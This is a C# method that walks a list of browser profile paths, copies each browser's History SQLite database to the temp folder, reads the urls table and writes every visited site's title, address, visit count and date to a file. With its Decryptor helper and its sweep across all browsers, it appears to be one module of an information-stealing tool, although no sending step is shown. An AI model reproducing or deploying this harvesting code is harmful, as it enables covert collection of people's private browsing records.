// history
public static void SAVE(string filename)
{
    int counter = 0;

    using (StreamWriter sw = new StreamWriter(filename))
    {
        foreach (string browser in Paths.Browser)
        {
            string Browser = Paths.GetUserData(browser) + "History";
            if (File.Exists(Browser))
            {
                string temp = Environment.GetEnvironmentVariable("temp") + "\\browserHistory";
                if (File.Exists(temp))
                {
                    File.Delete(temp);
                }
                File.Copy(Browser, temp);

                SQL sSQLite = new SQL(temp);
                sSQLite.ReadTable("urls");

                for (int i = 0; i < sSQLite.GetRowCount(); i++)
                {
                    string url = Convert.ToString(sSQLite.GetValue(i, 1));
                    string title = Convert.ToString(sSQLite.GetValue(i, 2));
                    int visits = Int32.Parse(Convert.ToString(Convert.ToInt32(sSQLite.GetValue(i, 3)) + 1));
                    string time = Convert.ToString(TimeZoneInfo.ConvertTimeFromUtc(DateTime.FromFileTimeUtc(10 * Convert.ToInt64(sSQLite.GetValue(i, 5))), TimeZoneInfo.Local));

                    if (string.IsNullOrEmpty(url))
                    {
                        break;
                    }

                    try
                    {
                        sw.WriteLine($"Title: {Decryptor.GetUTF8(title)} | Host: {url} | Visits: {visits} | Date: {time}");
                        counter++;
                    }
                    catch { }

                    continue;
                }
            }
        }
    }

    Console.WriteLine($"Found {counter} history data and saved in {filename}");
}